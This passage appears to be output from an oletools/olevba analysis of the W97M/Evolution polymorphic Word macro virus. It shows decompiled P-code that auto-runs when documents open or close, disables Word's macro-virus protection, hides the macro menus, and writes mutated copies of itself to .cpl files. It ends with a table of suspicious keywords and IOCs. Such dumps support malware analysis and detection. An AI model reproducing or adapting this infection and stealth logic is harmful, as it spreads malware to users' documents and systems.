' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Norminf 0x0000 
' 	EndIf 
' Line #349:
' 	Ld FileInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FileInft 0x0000 
' 	EndIf 
' Line #350:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #351:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #352:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #353:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #354:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #355:
' 	QuoteRem 0x0000 0x000F " W97M/Evolution"
' Line #356:
' 	QuoteRem 0x0000 0x002B " W97M/Evolution .a Variant by Nex and Error"
' Line #357:
' 	QuoteRem 0x0000 0x0027 " Polymorphic Stealth Word97 Macro Virus"
' Line #358:
' 	QuoteRem 0x0000 0x001A " All Things Must Change..."
' Line #359:
' 	QuoteRem 0x0000 0x004F " Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
' Line #360:
' 	QuoteRem 0x0000 0x0010 " RAPE v1.1 does:"
' Line #361:
' 	QuoteRem 0x0000 0x0035 " Randomly Morphs Source Code by Adding Random Remarks"
' Line #362:
' 	QuoteRem 0x0000 0x003A " Randomly Selects Source Code Export File - Then Morphs it"
' Line #363:
' 	QuoteRem 0x0000 0x0022 " Randomly Creates Virus Macro Name"
' Line #364:
' 	QuoteRem 0x0000 0x0026 " Randomly Adds 1 to 6 Commands to Code"
' Line #365:
' 	EndFunc 
' Line #366:
' 	FuncDefn (Sub AutoClose())
' Line #367:
' 	OnError (Resume Next) 
' Line #368:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #369:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #370:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #371:
' 	EndSub 
' Line #372:
' 	FuncDefn (Sub AutoExec())
' Line #373:
' 	OnError (Resume Next) 
' Line #374:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #375:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #376:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #377:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #378:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #379:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #380:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #381:
' 	EndSub 
' Line #382:
' 	FuncDefn (Sub AutoExit())
' Line #383:
' 	OnError (Resume Next) 
' Line #384:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #385:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #386:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St PMExport 
' Line #387:
' 	Ld PMExport 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PMFile_Yes 
' 	EndIf 
' Line #388:
' 	Ld PMFile_Yes 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #389:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "W97M/Evolution .a by Nex"
' 	PrintItemNL 
' Line #391:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
' 	PrintItemNL 
' Line #392:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #393:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #394:
' 	LitDI2 0x0002 
' 	Ld FileID 
' 	LineInput 
' Line #395:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #396:
' 	Ld FileID 
' 	LitDI2 0x0009 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #397:
' 	LitDI2 0x0009 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "' EOF"
' 	PrintItemNL 
' Line #398:
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0001 
' Line #399:
' 	Ld FileID 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #400:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #401:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #402:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #403:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #404:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #405:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #406:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #407:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #408:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #409:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #410:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #411:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #412:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #413:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #414:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #415:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #416:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #417:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #418:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #419:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #420:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #421:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #422:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #423:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #424:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #425:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #426:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #427:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #428:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #429:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #430:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #431:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #432:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #433:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld False 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID2 
' Line #434:
' 	Ld FileID2 
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #435:
' 	Do 
' Line #436:
' 	Label inpux 
' Line #437:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #438:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #439:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #440:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #441:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #442:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #443:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #444:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	GoTo inpux 
' 	EndIf 
' Line #445:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #446:
' 	QuoteRem 0x0000 0x0047 " Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)"
' Line #447:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #448:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #449:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #450:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsCall Kill 0x0001 
' Line #451:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0005 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #452:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID2 
' 	PrintItemNL 
' Line #453:
' 	LitDI2 0x0005 
' 	Sharp 
' 	Close 0x0001 
' Line #454:
' 	EndSub 
' Line #455:
' 	FuncDefn (Sub AutoNew())
' Line #456:
' 	OnError (Resume Next) 
' Line #457:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #458:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #459:
' 	EndSub 
' Line #460:
' 	FuncDefn (Sub AutoOpen())
' Line #461:
' 	OnError (Resume Next) 
' Line #462:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #463:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #464:
' 	EndSub 
' Line #465:
' 	FuncDefn (Sub FileTemplates())
' Line #466:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #467:
' 	EndSub 
' Line #468:
' 	FuncDefn (Sub ToolsCustomize())
' Line #469:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #470:
' 	EndSub 
' Line #471:
' 	FuncDefn (Sub ToolsMacro())
' Line #472:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #473:
' 	EndSub 
' Line #474:
' 	FuncDefn (Sub ViewVBCode())
' Line #475:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #476:
' 	EndSub 
' Line #477:
' 	QuoteRem 0x0000 0x0035 " "The most polymorphic Macro Virus to date...." - NAI"
' Line #478:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #479:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

